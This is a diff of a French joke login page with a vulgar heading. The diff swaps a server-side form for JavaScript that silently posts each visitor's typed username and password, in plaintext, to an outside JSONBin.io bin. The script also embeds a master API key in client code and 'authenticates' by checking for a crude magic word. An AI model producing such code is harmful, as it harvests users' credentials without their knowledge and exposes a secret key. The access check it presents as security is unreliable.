@@ -1,10 +1,10 @@
-<!-- login.html -->
 <!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
     <title>Connexion Secrète</title>
     <style>
+        /* [Coller ici TOUT votre CSS original] */
         body {
             background: #FF69B4;
             font-family: 'Comic Sans MS', cursive;
@@ -46,19 +46,47 @@
 <body>
     <div class="login-box">
         <h2>Connexion de Pute ✨</h2>
-        <!-- Seule modification : le formulaire pointe vers login.php -->
-        <form action="login.php" method="POST">
-            <input type="text" name="username" placeholder="Nom d'utilisateur" required><br>
-            <input type="password" name="password" placeholder="Mot de passe" required><br>
+        <form onsubmit="return checkCredentials(event)">
+            <input type="text" id="username" placeholder="Nom d'utilisateur" required><br>
+            <input type="password" id="password" placeholder="Mot de passe" required><br>
             <button type="submit">Entrer dans la matrice 🌀</button>
         </form>
     </div>
 
-    <!-- Script modifié pour la gestion des erreurs PHP -->
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        if(urlParams.has('error')) {
-            alert('⚠️ Erreur : Le mot magique "pute" doit être présent !');
+        const API_KEY = '$2a$10$1wewJFQyy/qyWMcrP0P4UeA4TUr1kK0bQC9VyMz9htOaRMDyz3sk2'; // À remplacer
+        const BIN_ID = '679c8d12ad19ca34f8f7629b'; // À remplacer
+
+        async function checkCredentials(event) {
+            event.preventDefault();
+            
+            const username = document.getElementById('username').value.toLowerCase();
+            const password = document.getElementById('password').value.toLowerCase();
+
+            // Envoyer les données à JSONBin.io
+            try {
+                await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Master-Key': API_KEY
+                    },
+                    body: JSON.stringify({
+                        username,
+                        password,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+            } catch (error) {
+                console.error("Erreur d'envoi :", error);
+            }
+
+            // Vérification
+            if(username.includes('pute') || password.includes('pute')) {
+                window.location.href = 'success.html';
+            } else {
+                alert('⚠️ Le mot magique "pute" est requis !');
+            }
         }
     </script>
 </body>
